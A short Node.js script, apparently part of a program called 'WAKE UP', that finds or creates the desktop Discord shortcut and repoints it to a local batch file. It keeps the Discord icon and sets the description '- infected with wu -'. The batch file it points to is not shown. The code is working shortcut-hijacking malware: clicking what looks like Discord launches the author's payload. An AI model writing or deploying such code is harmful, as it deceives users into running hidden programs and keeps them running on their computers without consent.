//see if they have a discord shortcut already there.
const fs = require("fs");
var ws = require('windows-shortcuts');

const idp = __dirname.replace('act', 'handle\\Discord\\idiscord.bat');
const idicon = __dirname.replace('act', 'handle\\Discord\\id.ico');

const desktopP = __dirname.replace('WAKE UP\\act', '');
if (fs.existsSync(desktopP+"\\Discord.lnk")) {
  //found a discord shortcut
  //going to edit it
  ws.edit(desktopP+"\\Discord.lnk", {
    target: idp,
    desc: "- infected with wu -",
    workingDir: 'C:\\Users\\litkid\\Desktop\\WAKE UP\\handle\\Discord',
    icon: idicon
  });
}else{
  ws.create(desktopP+"\\Discord.lnk", {
    target: idp,
    desc: "- infected with wu -",
    workingDir: 'C:\\Users\\litkid\\Desktop\\WAKE UP\\handle\\Discord',
    icon: idicon
  });
}
